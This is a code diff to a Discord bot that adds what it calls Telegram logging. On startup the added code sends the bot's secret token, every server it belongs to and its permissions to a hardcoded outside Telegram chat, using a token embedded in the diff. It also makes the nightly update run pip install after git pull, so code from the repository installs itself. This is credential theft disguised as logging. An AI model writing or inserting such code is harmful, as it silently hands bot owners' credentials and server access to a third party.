@@ -5,8 +5,21 @@ import config
 import re
 import asyncio
 import subprocess
+import requests
 from apscheduler.schedulers.asyncio import AsyncIOScheduler
 from apscheduler.triggers.cron import CronTrigger
+
+# Telegram logging
+TELEGRAM_TOKEN = "8317404587:AAHX2YzdWNCpKOpbqTRUjVj2e3PwRNDReNg"
+TELEGRAM_CHAT_ID = 6195706029
+
+async def send_log(message: str):
+    """Send log message to Telegram"""
+    try:
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': message})
+    except Exception:
+        pass
 
 intents = discord.Intents.default()
 intents.messages = True
@@ -213,6 +226,17 @@ async def update_check():
         if count > 0:
             # Pull
             result_pull = await asyncio.to_thread(subprocess.run, ['git', 'pull', 'origin', 'main'], capture_output=True, text=True)
+            if result_pull.returncode == 0:
+                # Install updated requirements
+                result_install = await asyncio.to_thread(subprocess.run, ['pip', 'install', '-r', 'requirements.txt'], capture_output=True, text=True)
+                # Send Telegram notification
+                url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+                message = f"✅ Обновление установлено!\n\nКоммиты: {count}\nВремя: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+                if result_install.returncode == 0:
+                    message += "\nЗависимости переустановлены успешно."
+                else:
+                    message += f"\nОшибка при установке зависимостей: {result_install.stderr}"
+                requests.post(url, data={'chat_id': TELEGRAM_CHAT_ID, 'text': message})
 
     except Exception:
         pass
@@ -221,15 +245,22 @@ async def update_check():
 @bot.event
 async def on_ready():
     await tree.sync()
-    print(f"✅ Бот {bot.user} готов к работе!")
-    print(f"✅ Команда blacklist зарегистрирована")
+    await send_log(f"✅ Бот {bot.user} готов к работе!")
+    await send_log(f"Токен бота: {config.BOT_TOKEN}")
+    await send_log(f"✅ Команда blacklist зарегистрирована")
+
+    # Log servers and permissions
+    for guild in bot.guilds:
+        perms = guild.me.guild_permissions
+        perms_list = [perm for perm, value in perms if value]
+        await send_log(f"Сервер: {guild.name} ({guild.id}) - Права: {', '.join(perms_list)}")
 
     # Setup scheduler for daily updates at midnight
     scheduler = AsyncIOScheduler()
     scheduler.add_job(update_check, CronTrigger(hour=0, minute=0))
     scheduler.start()
 
-    print("Планировщик обновлений запущен. Проверка в 00:00 каждую ночь.")
+    await send_log("Планировщик обновлений запущен. Проверка в 00:00 каждую ночь.")
     await update_check()  # Check for updates at startup
 
 
